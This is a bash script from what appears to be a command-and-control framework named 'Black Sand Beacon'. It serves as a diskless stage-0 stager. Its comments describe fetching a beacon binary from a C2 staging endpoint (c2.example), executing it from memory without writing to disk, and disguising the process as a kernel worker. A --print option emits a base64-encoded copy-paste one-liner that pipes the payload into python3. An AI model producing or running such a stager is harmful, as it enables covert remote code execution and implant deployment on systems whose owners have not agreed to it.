#!/usr/bin/env bash
# Black Sand Beacon diskless stager (Stage-0 one-liner).
#
# Fetches the packed beacon ELF + config from the C2 staging endpoints
# and execs the beacon from an anonymous memfd. Never touches disk.
#
# Environment:
#   BSB_STAGE_URL          e.g. https://c2.example:7070
#   BSB_STAGE_TOKEN        must match server.stage_token in config.json
#   BSB_STAGE_ARGV0        optional argv[0] disguise (default kworker/u8:2)
#   BSB_STAGE_INSECURE_TLS set to 1 to skip TLS verification (lab only)
#
# Usage:
#   bash stage_oneliner.sh
#   bash stage_oneliner.sh --print   # print the copy-paste one-liner
set -euo pipefail
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

if [ "${1:-}" = "--print" ]; then
    blob=$(base64 -w0 "$DIR/stage_payload.py")
    printf 'echo %s | base64 -d | BSB_STAGE_URL=%q BSB_STAGE_TOKEN=%q python3 -\n' \
        "$blob" "${BSB_STAGE_URL:?set BSB_STAGE_URL}" "${BSB_STAGE_TOKEN:?set BSB_STAGE_TOKEN}"
    exit 0
fi

exec python3 "$DIR/stage_payload.py"
